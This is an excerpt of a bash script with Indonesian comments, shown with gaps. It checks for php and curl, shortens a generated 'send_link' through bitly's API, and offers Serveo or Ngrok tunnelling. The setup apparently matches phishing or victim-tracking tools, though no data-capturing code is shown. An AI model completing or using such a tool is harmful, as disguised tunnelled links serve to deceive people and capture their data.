#!/bin/bash
#Berusalah untuk meperbaiki script yang rusak
#WhoMHw  && Mr.WR.py
#jangan patah semangat sesungguhnya kamu bisa
bi='\033[34;1m' #biru
ij='\033[32;1m' #ijo
pr='\033[35;1m' #purple
cy='\033[36;1m' #cyan
...
command -v php > /dev/null 2>&1 || { echo >&2 "Install php Lah Tod"; exit 1; }



command -v curl > /dev/null 2>&1 || { echo >&2 "Install curl Lah tod"; exit 1; }
...
send_ip=$(curl -s http://bitly.com/api-create.php?url=$send_link)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] LinkBitly:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"
checkfound
...
start1() {
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m pakai Serveo.net (SSH Tunelling, Best!)\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m pakai Ngrok\e[0m\n"
